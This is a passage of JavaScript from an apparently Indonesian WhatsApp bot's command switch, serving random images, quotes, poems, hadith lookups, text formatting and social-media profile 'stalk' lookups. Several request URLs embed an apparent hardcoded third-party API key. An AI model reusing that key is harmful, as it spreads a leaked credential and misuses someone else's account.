var notnot = JSON.parse(fs.readFileSync('./search/tiktokpics/japan.json'))
var hasil = pickRandom(notnot)
Al.sendMessage(m.chat, { caption: '*හායි යාලුවනේ...👋😇*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n*✨මගෙ චැනල් එකට Join වෙන්න...💗*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n -𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥~', image: { url: hasil.url } }, { quoted: floc})
break
//========================
case 'korean': 
case 'korea': 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
m.reply('_Loading..._')
var notnot = JSON.parse(fs.readFileSync('./search/tiktokpics/korea.json'))
var hasil = pickRandom(notnot)
Al.sendMessage(m.chat, { caption: '*හායි යාලුවනේ...👋😇*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n*✨මගෙ චැනල් එකට Join වෙන්න...💗*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n -𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥~', image: { url: hasil.url } }, { quoted: floc})
break
//========================
case 'malaysia':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
m.reply('_Loading..._')
var notnot = JSON.parse(fs.readFileSync('./search/tiktokpics/malaysia.json'))
var hasil = pickRandom(notnot)
Al.sendMessage(m.chat, { caption: '*හායි යාලුවනේ...👋😇*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n*✨මගෙ චැනල් එකට Join වෙන්න...💗*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n -𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥~', image: { url: hasil.url } }, { quoted: floc})
break
//========================
case 'randomgirl':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
m.reply('_Loading..._')
var notnot = JSON.parse(fs.readFileSync('./search/tiktokpics/random.json'))
var hasil = pickRandom(notnot)
Al.sendMessage(m.chat, { caption: '*හායි යාලුවනේ...👋😇*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n*✨මගෙ චැනල් එකට Join වෙන්න...💗*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n -𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥~', image: { url: hasil.url } }, { quoted: floc})
break
//========================
case 'randomboy':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
m.reply('_Loading..._')
var notnot = JSON.parse(fs.readFileSync('./search/tiktokpics/random2.json'))
var hasil = pickRandom(notnot)
Al.sendMessage(m.chat, { caption: '*හායි යාලුවනේ...👋😇*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n*✨මගෙ චැනල් එකට Join වෙන්න...💗*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n -𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥~', image: { url: hasil.url } }, { quoted: floc})
break
//========================
case 'thailand': 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
m.reply('_Loading..._')
var notnot = JSON.parse(fs.readFileSync('./search/tiktokpics/thailand.json'))
var hasil = pickRandom(notnot)
Al.sendMessage(m.chat, { caption: '*හායි යාලුවනේ...👋😇*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n*✨මගෙ චැනල් එකට Join වෙන්න...💗*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n -𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥~', image: { url: hasil.url } }, { quoted: floc})
break
//========================
case 'vietnam':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
m.reply('_Loading..._')
var notnot = JSON.parse(fs.readFileSync('./search/tiktokpics/vietnam.json'))
var hasil = pickRandom(notnot)
Al.sendMessage(m.chat, { caption: '*හායි යාලුවනේ...👋😇*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n*✨මගෙ චැනල් එකට Join වෙන්න...💗*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n -𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥~', image: { url: hasil.url } }, { quoted: floc})
break       
//========================
case 'infoowner': 
case 'ownerinfo':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
let gasin = `
*I N F O  O W N E R*

*Nama :* ${namaowner}
*Umur :* ${umurowner}
*Kelas :* ${kelasowner}
*Status :* ${statusowner}
*Gender :* ${lakiapacewek}

Creator *${namabot}*

*${namaowner}* tertarik aja sma bot wa🗿`
Al.sendMessage(m.chat, {text: gasin }, {quoted: floc1})
}
break
// Gak perlu Di isi 🗿
//========================
case 'call':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return ('Fitur Khusus Group!')
if (!q) return m.reply(`*Contoh :* ${prefix}${command} test`)
Al.relayMessage(m.chat, {
		scheduledCallCreationMessage: {
		callType: "VIDEO",		
		scheduledTimestampMs: 12000,
		title: `${text}`,		
		inviteCode: 'AiBotzz-MD.com',
		}
	}, {})
	}
	break
//========================
case 'tt': 
case 'tiktok': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!text) return m.reply( `*Example :* ${prefix + command} linknya`)
await Al.sendMessage(m.chat, { react: { text: "🔎",key: m.key,}})   
if (!q.includes('tiktok')) return m.reply(`Link Invalid!`)
require('./lib/tiktok').Tiktok(q).then( data => {
Al.sendMessage(m.chat, { caption: `𝗠𝗔𝗡𝗨-𝗠𝗗`, video: {url: data.watermark }}, {quoted:floc})
})
}
break
//========================
case 'gconly':
case 'gruponly':
case 'grouppnly':
if (!isRegistered) return terdaftar()
if (!isCreator) return m.reply('Special For Owner Features!')
if (args[0] == 'on'){
if (global.groupOnly) return m.reply('Already active beforehand!')
global.groupOnly = true
m.reply('Sukses Mengubah Ke Group Only')
} else if (args[0] == 'off'){
if (!global.groupOnly) return m.reply('Sudah Nonaktif Sebelumnya!')
global.groupOnly = false
m.reply('Sukses Mengubah Ke Mode Publik')
} else m.reply(`*Contoh :* ${prefix+command} on/off`)
break
//========================
case 'pconly':
case 'privatonly':
case 'privatepnly':
if (!isRegistered) return terdaftar()
if (!isCreator) return m.reply('Special For Owner Features!')
if (args[0] == 'on'){
if (global.privateOnly) return m.reply('Already active beforehand!')
global.privateOnly = true
m.reply('Sukses Mengubah Ke Private Only')
} else if (args[0] == 'off'){
if (!global.privateOnly) return m.reply('Sudah Nonaktif Sebelumnya!')
global.privateOnly = false
m.reply('Sukses Mengubah Ke Mode Publik')
} else m.reply(`*Contoh :* ${prefix+command} on/off`)
break
//========================
case 'bmode':
case 'mode':
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!isCreator) return m.reply('Special For Owner Features!')
if (!q) return m.reply(`*Contoh :*\n${prefix+command} public\n${prefix+command} self`)
if (args[0] === "public") {
Al.public = true
await m.reply('Succes To Mode Public')
}
if (args[0] === "self") {
Al.public = false
await m.reply('Succes To Mode Self')
}
break
//========================
case 'quotesislami': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
const islami = [
   {
      "id": "1",
      "arabic": "مَنْ سَارَ عَلىَ الدَّرْبِ وَصَلَ",
      "arti": "Barang siapa berjalan pada jalannya, maka dia akan sampai (pada tujuannya)."
   },
   {
      "id": "2",
      "arabic": "مَنْ صَبَرَ ظَفِرَ",
      "arti": "Barang siapa bersabar, maka dia akan beruntung."
   },
   {
      "id": "3",
      "arabic": "مَنْ جَدَّ وَجَـدَ",
      "arti": "Barang siapa bersungguh-sungguh, maka dia akan meraih (kesuksesan)."
   },
   {
      "id": "4",
      "arabic": "جَالِسْ أَهْلَ الصِّدْقِ وَالوَفَاءِ",
      "arti": "Bergaulah bersama orang-orang yang jujur dan menepati janji."
   },
   {
      "id": "5",
      "arabic": "مَنْ قَلَّ صِدْقُهُ قَلَّ صَدِيْقُهُ",
      "arti": "Barang siapa sedikit kejujurannya, maka sedikit pulalah temannya."
   },
   {
      "id": "6",
      "arabic": "مَوَدَّةُ الصَّدِيْقِ تَظْهَرُ وَقْتَ الضِّيْقِ",
      "arti": "Kecintaan seorang teman itu akan terlihat pada waktu kesempitan."
   },
   {
      "id": "7",
      "arabic": "الصَّبْرُ يُعِيْنُ عَلَى كُلِّ عَمَلٍ",
      "arti": "Kesabaran akan menolong segala pekerjaan."
   },
   {
      "id": "8",
      "arabic": "وَمَا اللَّذَّةُ إِلاَّ بَعْدَ التَّعَبِ",
      "arti": "Tidak ada kenikmatan kecuali setelah kepayahan."
   },
   {
      "id": "9",
      "arabic": "جَرِّبْ وَلاَحِظْ تَكُنْ عَارِفًا",
      "arti": "Coba dan perhatikanlah, maka engkau akan menjadi orang yang tahu."
   },
   {
      "id": "10",
      "arabic": "بَيْضَةُ اليَوْمِ خَيْرٌ مِنْ دَجَاجَةِ الغَدِ",
      "arti": "Telur hari ini lebih baik daripada ayam esok hari."
   },
   {
      "id": "11",
      "arabic": "أُطْلُبِ الْعِلْمَ مِنَ الْمَهْدِ إِلَى الَّلحْدِ",
      "arti": "Carilah ilmu sejak dari buaian hingga liang lahat."
   },
   {
      "id": "12",
      "arabic": "الوَقْتُ أَثْمَنُ مِنَ الذَّهَبِ",
      "arti": "Waktu itu lebih berharga daripada emas."
   },
   {
      "id": "13",
      "arabic": "لاَ خَيْرَ فيِ لَذَّةٍ تَعْقِبُ نَدَماً",
      "arti": "Tak ada kebaikan bagi kenikmatan yang diiringi dengan penyesalan."
   },
   {
      "id": "14",
      "arabic": "أَخِي لَنْ تَنَالَ العِلْمَ إِلاَّ بِسِتَّةٍ سَأُنْبِيْكَ عَنْ تَفْصِيْلِهَا بِبَيَانٍ: ذَكَاءٌ وَحِرْصٌ وَاجْتِهَادٌ وَدِرْهَمٌ وَصُحْبَةُ أُسْتَاذٍ وَطُوْلُ زَمَانٍ",
      "arti": "Wahai saudaraku, Kamu tidak akan memperoleh ilmu kecuali dengan enam perkara, akan aku sampaikan rinciannya dengan jelas; 1) Kecerdasan, 2) Ketamaan (terhadap ilmu), 3) Kesungguhan, 4) Harta benda (sebagai bekal), 5) Bergaul dengan guru, 6) Waktu yang lama."
   },
   {
      "id": "15",
      "arabic": "لاَ تَكُنْ رَطْباً فَتُعْصَرَ وَلاَ يَابِسًا فَتُكَسَّرَ",
      "arti": "Janganlah kamu bersikap lemah, sehingga kamu mudah diperas. Dan janganlah kamu bersikap keras, sehingga kamu mudah dipatahkan."
   },
   {
      "id": "16",
      "arabic": "لِكُلِّ مَقَامٍ مَقَالٌ وَلِكُلِّ مَقَالٍ مَقَامٌ",
      "arti": "Setiap tempat memiliki perkataannya masing-masing, dan setiap perkataan memiliki tempatnya masing-masing."
   },{
      "id": "17",
      "arabic": "خَيْرُ النَّاسِ أَحْسَنُهُمْ خُلُقاً وَأَنْفَعُهُمْ لِلنَّاسِ",
      "arti": "Sebaik-baik manusia adalah yang paling baik budi pekertinya dan yang paling bermanfaat bagi manusia lainnya."
   },
   {
      "id": "18",
      "arabic": "خَيْرُ جَلِيْسٍ في الزّمانِ كِتابُ",
      "arti": "Sebaik-baik teman duduk di setiap waktu adalah buku."
   },
   {
      "id": "19",
      "arabic": "مَنْ يَزْرَعْ يَحْصُدْ",
      "arti": "Barang siapa menanam, pasti ia akan memetik (mengetam)."
   },
   {
      "id": "20",
      "arabic": "لَوْلاَ العِلْمُ لَكَانَ النَّاسُ كَالبَهَائِمِ",
      "arti": "Kalaulah tidak karena ilmu, niscaya manusia itu seperti binatang."
   },
   {
      "id": "21",
      "arabic": "سَلاَمَةُ الإِنْسَانِ فيِ حِفْظِ اللِّسَانِ",
      "arti": "Keselamatan manusia itu terletak pada penjagaan lidahnya (perkataannya)."
   },
   {
      "id": "22",
      "arabic": "الرِّفْقُ بِالضَّعِيْفِ مِنْ خُلُقِ الشَّرِيْفِ",
      "arti": "Berlaku lemah lembut kepada orang yang lemah itu termasuk akhlak orang yang mulia (terhormat)."
   },
   {
      "id": "23",
      "arabic": "وَعَامِلِ النَّاسَ بِمَا تُحِبُّ مِنْهُ دَائِماً",
      "arti": "Dan bergaullah dengan manusia dengan sikap yang kamu juga suka diperlakukan seperti itu."
   },
   {
      "id": "24",
      "arabic": "لَيْسَ الجَمَالُ بِأَثْوَابٍ تُزَيِّنُنُا إِنَّ الجَمَالَ جمَاَلُ العِلْمِ وَالأَدَبِ",
      "arti": "Kecantikan bukanlah dengan pakaian yang melekat menghiasi diri kita, sesungguhnya kecantikan ialah kecantikan dengan ilmu dan budi pekerti."
   },
   {
      "id": "25",
      "arabic": "مَنْ أَعاَنَكَ عَلىَ الشَّرِّ ظَلَمَكَ",
      "arti": "Barang siapa membantumu dalam kejahatan, maka sesungguhnya ia telah berbuat aniaya terhadapmu."
   }
]
    const randomIndex = Math.floor(Math.random() * islami.length);
const randomQuote = islami[randomIndex];
const { arabic, arti } = randomQuote;
    m.reply(`${arabic}\n${arti}`)
}
break
//========================
case 'hadist': {
if (!text) return m.reply(`Hadist Siapa? Dan Nomer Berapa?, *Penggunaan:* ${command} abu-dawud 1`)
let hadist = args[0]
let nomer = args[1]
try {
let apiUrl = `https://hadis-api-id.vercel.app/hadith/${hadist}/${nomer}`
let response = await axios.get(apiUrl)
let data = response.data
m.reply(`*乂 HADIST ${data.name.toUpperCase()}*
${data.arab}

*Terjemah:* ${data.id}`)
} catch (e) {
console.error(e)
}}
break
//========================
case 'kuotesjay':
case 'kjay':
case 'qWann':
case 'quotesWann':
case 'qjay': 
case 'quotesjay': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
const { Wann } = require('./media/myquotes/Wann')
const Wannnya = Wann[Math.floor(Math.random() * Wann.length)]
await Al.sendMessage(m.chat, {text: `${Wannnya}` }, {quoted: fpay }) 
}
break
//========================
case 'quotessad':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
const lan = ['When lu udah berusaha ngelupain dia yang gabakal mungkin lu miliki, dan sial nya malah ketemu di dalam mimpi','Jika tidak bisa bersatu denganmu setidaknya dunia pernah menjadi saksi bahwa aku benar benar mencintaimu','Seharusnya dri dlu jngn berharap lebih kpd seseorang','Lebih baik tersakiti,daripada harus menyakiti','Hidup bukan sebuah perlombaan, nikmati aja setiap proses nya','Kita punya harapan tapi semesta punya kenyataan','Ternyata maksain komunikasi sama seseorang yang ga ada perasaan lebih sama kita itu nguras energi banget ya,','Dipaksa baik baik saja diatas bumi yang sudah tidak baik baik saja','Terkadang otak kita sudah beradaptasi tanpa kehadiran dia tapi hati sangat sulit untuk kehilangan dia','Malam yg tenang tapi tidak dengan pikiran','Ngentod knp dunia ga berpihak sama gw','Kubaca kembali chat lama kita kemudian aku tersenyum dan akhirnya aku menangis','Sudah kubilang payung hanya bisa dipakai untuk dua orang. Jika ada yang ketiga, maka salah satunya harus siap di guyur hujan beserta badainya. Tapi ini bukan tentang','Mau balik lagi? Maaf hubungan ini tidak bisa berlanjut lagi hehe','Feling lonley cape?,ya istirahat karna tuhan tau yang baik gak bikin kamu lonley','Cape sama dunia nt terus mungkin Tuhan sudah menyiapkan jalan terbaik buat kamu']
const lann = lan[Math.floor(Math.random() * lan.length)]
Al.sendMessage(from, { 
text: `${lann}`,
contextInfo:{
forwardingScore: 9999999,
isForwarded: false, 
mentionedJid:[m.sender],
"externalAdReply": {
"showAdAttribution": false,
"renderLargerThumbnail": false,
"title": ``,
"body": ``,
"description": 'Simpel Bot WhatsApp',
"containsAutoReply": false,
"mediaType": 2, 
"thumbnail": global.mark,
"mediaUrl": global.sgc
}
}
},{ 
quoted: fkontak })
}
break
//========================
case 'pantun2': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
let zeltoria = await fetch(`https://api.lolhuman.xyz/api/random/pantun?apikey=3ded02033757fbd61ff60876`)
let hasil = await zeltoria.json()
 m.reply(`${hasil.result}`.trim())
 }
 break
//========================
case 'ttstalk1': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!q) return m.reply(`*Contoh :* ${prefix+command} Risky_Aulia`)
await loading()
if (args.length == 0) return m.reply(`*Example :* ${prefix + command} bulansutena`)
axios.get(`https://api.lolhuman.xyz/api/stalktiktok/${args[0]}?apikey=3ded02033757fbd61ff60876`).then(({ data }) => {
var caption = `Username : ${data.result.username}\n`
caption += `Nickname : ${data.result.nickname}\n`
caption += `Followers : ${data.result.followers}\n`
caption += `Followings : ${data.result.followings}\n`
caption += `Likes : ${data.result.likes}\n`
caption += `Video : ${data.result.video}\n`
caption += `Bio : ${data.result.bio}\n`
Al.sendMessage(from, { image: { url: data.result.user_picture }, caption })
})
}
break
//========================
case 'ytstalk': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!q) return m.reply(`*Contoh :* ${prefix+command} Windah Basudara`)
await loading()
if (args.length == 0) return m.reply(`*Example :* ${prefix + command} Windah Basudara`)
axios.get(`https://api.lolhuman.xyz/api/ytchannel/${args[0]}?apikey=3ded02033757fbd61ff60876&query=${q}`).then(({ data }) => {
var caption = `Username : ${data.result.username}\n`
caption += `Nickname : ${data.result.nickname}\n`
caption += `Subscribers : ${data.result.subscribers}\n`
caption += `Likes : ${data.result.likes}\n`
caption += `Video : ${data.result.video}\n`
caption += `Bio : ${data.result.bio}\n`
Al.sendMessage(from, { image: { url: data.result.user_picture }, caption })
})
}
break
//========================
case 'igstalk1': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!q) return m.reply(`*Contoh :* ${prefix+command} Wann_yete`)
if (args.length == 0) return m.reply(`*Example :* ${prefix + command} whyzzxy`)
await loading()
let j = await fetchJson(`https://api.lolhuman.xyz/api/stalkig/${args[0]}?apikey=3ded02033757fbd61ff60876`)
let caption = `Username : ${j.result.username}\n`
caption += `Full Name : ${j.result.fullname}\n`
caption += `Posts : ${j.result.posts}\n`
caption += `Followers : ${j.result.followers}\n`
caption += `Following : ${j.result.following}\n`
caption += `Bio : ${j.result.bio}`
Al.sendMessage(m.chat, { image: { url: j.result.photo_profile }, caption })
}
break
//========================
case 'mlstalk': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!q) return m.reply(`*Example :* ${prefix+command} 530793138|8129`)
m.reply('_Loading..._')
let dat = await mlstalk.mlstalk(q.split("|")[0], q.split("|")[1])
m.reply(`*/ Mobile Legend Stalker \\*

Username : ${dat.userName}
Id : ${q.split("|")[0]}
ID Zone : ${q.split("|")[1]}`)
}
break
//========================
case 'npmstalk':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!q) return m.reply(`*Example :* ${prefix+command} xeonapi`)
m.reply('_Loading...')
eha = await npmstalk.npmstalk(q)
m.reply(`*/ Npm Stalker \\*

Name : ${eha.name}
Version Latest : ${eha.versionLatest}
Version Publish : ${eha.versionPublish}
Version Update : ${eha.versionUpdate}
Latest Dependencies : ${eha.latestDependencies}
Publish Dependencies : ${eha.publishDependencies}
Publish Time : ${eha.publishTime}
Latest Publish Time : ${eha.latestPublishTime}`)
}
break
//========================
case 'ffstalk':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!q) return m.reply(`*Example :* ${prefix+command} 946716486`)
m.reply('_Loading..._')
eeh = await ffstalk.ffstalk(`${q}`)
m.reply(`*/ Free Fire Stalker \\*

Id : ${eeh.id}
Nickname : ${eeh.nickname}`)
}
break
//========================
case 'gombal': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
const gombal = ["Ku tuliskan namamu di langit, angin meniupnya. Ku tuliskan namamu di laut, badai membawanya. Ku tuliskan namamu di hatiku, cinta namanya.", "Kamu itu seperti garam di lautan, tidak terlihat namun akan selalu ada untuk selamanya.", "Hari Minggu itu weekend tapi kalau cinta kita will never end.", "Angkutan kota jauh dekat 2 ribu, kalau kamu jauh dekat ya di hatiku.", "Aku tidak peduli ramalan BMKG, sebab saat hujan, badai bahkan tsunami aku akan tetap bertahan pada cintamu.", "Ada 3 hal di dunia ini yang tidak bisa kuhitung, jumlah bintang di langit, ikan di laut dan cintaku padamu.", "Sekarang aku gendutan gak sih? Kamu tau gak kenapa? Soalnya kamu udah mengembangkan cinta yang banyak di hatiku.", "Aku ingin kita seperti sandal jepit sebab hanya ada dua, tidak ada yang namanya orang ketiga.", "Kalau hitungan satu sampai sepuluh, cintaku cukup nomor dua, yaitu dualem banget.", "Katanya kalau sering hujan itu bisa bikin seseorang terhanyut, kalau aku sekarang sedang terhanyut di dalam cintamu.", "Orangtuamu pengrajin bantal yah? Karena terasa nyaman jika di dekatmu.", "Aku rela menjadi lilin dalam hati kamu, dan kamu yang jagain lilinnya.", "Cita-citaku dulu pengen jadi dokter tapi setelah mengenalmu, berubah jadi ingin membahagiakanmu.", "Nek buku jendela ilmu, sliramu jendela atiku.", "Kalau hitungan satu sampai sepuluh, cintaku cukup nomor dua, yaitu dualem banget.", "Cintaku padamu seperti utang. Awalnya kecil, didiemin, tau-tau gede sendiri.", "Aku rela dipenjara seumur hidup, asalkan pelanggarannya karena mencintaimu.", "Ketika kau mencintainya dan kau hanya mendapat hujan, cintailah aku sebagai pelangimu.", "Cowok boleh nggak sih minum jamu sari rapet, soalnya aku mau rapetin hati aku ke hati kamu.", "Jika kamu tanya berapa kali kamu datang ke pikiranku, jujur saja, cuma sekali. Habisnya, nggak pergi-pergi sih!", "Aku hanya ingin hidup cukup. Cukup lihat senyummu setiap hari."]
const gombalan = gombal[Math.floor(Math.random() * gombal.length)]
Al.sendMessage(m.chat, {text: `${gombalan}` }, {quoted: fkontak})
}
break
//========================
case 'galau': case 'sad': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
const { galau } = require('./media/anime/galau')
const galaunya = galau[Math.floor(Math.random() * galau.length)]
m.reply(`${galaunya}`)
}
break
//========================
case 'puisi': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
const puii = ["Lemari tua itu, masih ada di pojok ruang\nDulu waktu kecil\nAku senang sembunyi di belakangnya\n\nRuangan itu masih menyimpan kenangan\nMeski tak ada lagi kelambu dan lampu sentir\nYang dulu selalu eyang pasang\nMenjelang maghrib\n\nSemua telah tiada\nDitelan waktu\nTapi dalam kenanganku\nSemua segar membayang\nBagai baru usai kemarin\n\nAku termangu di ruang bisu\nAnganku hadir\nAndai aku kembali kecil.", "Biru Bukit, Bukit Kelu\n\nAdalah hujan dalam kabut yang ungu\nTurun sepanjang gunung dan bukit biru\nKetika kota cahaya dan dimana bertemu\nAwan putih yang menghinggapi cemaraku.\n\nAdalah kemarau dalam sengangar berdebu\nTurun sepanjang gunung dan bukit kelu\nKetika kota tak bicara dan terpaku\nGunung api dan hama di ladang-ladangku.\n\nLereng-lereng senja\nPernah menyinar merah kesumba\nPadang ilalang dan bukit membatu\nTanah airku.", "Doa kepada pemeluk teguh\n\nTuhanku\nDalam termangu\nAku masih menyebut namamu\n\nBiar susah sungguh\nmengingat Kau penuh seluruh\ncayaMu panas suci\ntinggal kerdip lilin di kelam sunyi\nTuhanku\naku hilang bentuk remuk\n\nTuhanku\naku mengembara di negeri asing\n\nTuhanku\ndi pintuMu aku mengetuk\naku tidak bisa berpaling", "Sajadah Panjang\n\nAda sajadah panjang terbentang\nDari kaki buaian\nSampai ke tepi kuburan hamba\nKuburan hamba bila mati\n\nAda sajadah panjang terbentang\nHamba tunduk dan sujud\nDi atas sajadah yang panjang ini\nDiselingi sekedar interupsi\n\nMencari rezeki, mencari ilmu\nMengukur jalanan seharian\nBegitu terdengar suara azan\nKembali tersungkur hamba\n\nAda sajadah panjang terbentang\nHamba tunduk dan rukuk\nHamba sujud dan tak lepas kening hamba\nMengingat Dikau Sepenuhnya"]
const siii = puii[Math.floor(Math.random() * puii.length)]
Al.sendMessage(m.chat, {text: `${siii}` }, {quoted: fkontak})
}
break
//========================
case 'delete': 
case 'del': 
case 'd': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!isCreator && !isPremium) return m.reply('Lu bukan premium')
if (!m.quoted) return m.reply('Reply pesan yang ingin dihapus!')
Al.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: true,
id: m.quoted.id,
participant: m.quoted.sender
}
})
}
break
//========================
case 'txt2img':{
if (!isRegistered) return terdaftar()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is up, please send ${prefix}The limit to check the limit`)
if (isBan) return terbanned()
if (!q) return m.reply('Masukan promptnya\n\n*Example :*\n1girl, with glasses, in beach')
Al.sendMessage(m.chat, { react: { text: `💗`, key: m.key }})
try {
let txt = await getBuffer(`https://widipe.com/ai/text2img?text=${text}`)
await Al.sendMessage(m.chat, {image: txt, caption: `𝗠𝗔𝗡𝗨-𝗠𝗗`},{ quoted: floc})
Al.sendMessage(m.chat, { react: { text: `🔥`, key: m.key }})
} catch (e) {
m.reply('Gagal Mengconvert Gambar') 
}
}
break
//========================
case 'bold': 
case 'tebal': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!q) return m.reply(`Masukan teks!\n\n*Contoh :* ${prefix+command} Komeng`)
let tebel = `*${q}*`
Al.sendMessage(m.chat, {text: tebel }, {quoted: fkontak})
}
break
//========================
case 'italic': 
case 'miring': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!q) return m.reply(`Masukan teks!\n\n*Contoh :* ${prefix+command} Komeng`)
let miring = `_${q}_`
Al.sendMessage(m.chat, {text: miring }, {quoted: m})
}
break
//========================
case 'bolditalic': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!q) return m.reply(`Masukan teks!\n\n*Contoh :* ${prefix+command} Komeng`)
let tebmir = `_*${q}*_`
Al.sendMessage(m.chat, {text: tebmir }, {quoted: m})
}
break
//========================
case 'severed': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!q) return m.reply(`Masukan teks!\n\n*Contoh :* ${prefix+command} Komeng`)
let bgaris = `~${q}~`
Al.sendMessage(m.chat, {text: bgaris }, {quoted: m})
}
break
//========================
case 'sevbold': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!q) return m.reply(`Masukan teks!\n\n*Contoh :* ${prefix+command} Komeng`)
let tblg = `~*${q}*~`
Al.sendMessage(m.chat, {text: tblg }, {quoted: m})
}
break
//========================
case 'sevitalic': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!q) return m.reply(`Masukan teks!\n\n*Contoh :* ${prefix+command} Komeng`)
let svitl = `_~${q}~_`
Al.sendMessage(m.chat, {text: svitl }, {quoted: m})
}
break
//========================
case 'kapankah': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!q) return m.reply('Masukan pertanyaan!')
const kapan = ['Besok','Lusa','1 Hari Lagi','2 Hari Lagi','3 Hari Lagi','4 Hari Lagi','5 Hari Lagi','6 Hari Lagi','1 Bulan Lagi','2 Bulan Lagi','3 Bulan Lagi','4 Bulan Lagi','5 Bulan Lagi','6 Bulan Lagi','7 Bulan Lagi','8 Bulan Lagi','9 Bulan Lagi','10 Bulan Lagi','11 Bulan Lagi','1 Tahun lagi','2 Tahun lagi','3 Tahun lagi','4 Tahun lagi','5 Tahun lagi','6 Tahun lagi','7 Tahun lagi','8 Tahun lagi','9 Tahun lagi','10 Tahun lagi']
const koh = kapan[Math.floor(Math.random() * kapan.length)]
Al.sendMessage(m.chat, {text: `*Pertanyaan :* Kapankah ${q}\n*Jawaban :* ${koh}` }, {quoted: fkontak})
}
break
//========================
case 'bisakah': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!q) return m.reply('Masukan pertanyaan!')
const bisa = ['Bisa dong', 'Bisa', 'Mungkin bisa', 'Gak bisa lah', 'Gak bisa', 'Kayaknya gak bisa', 'Gak tau', 'Kamu nanya']
const kuh = bisa[Math.floor(Math.random() * bisa.length)]
Al.sendMessage(m.chat, {text: `*Pertanyaan :* Bisakah ${q}\n*Jawaban :* ${kuh}` }, {quoted: fkontak})
}
break
//========================
case 'haruskah': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!q) return m.reply('Masukan pertanyaan!')
const harus = ['Harus dong', 'Harus lah', 'Harus', 'Kayaknya harus', 'Gak harus', 'Gak lah', 'Kayaknya gak harus', 'Gak tau', 'Kamu nanya']
const keh = harus[Math.floor(Math.random() * harus.length)]
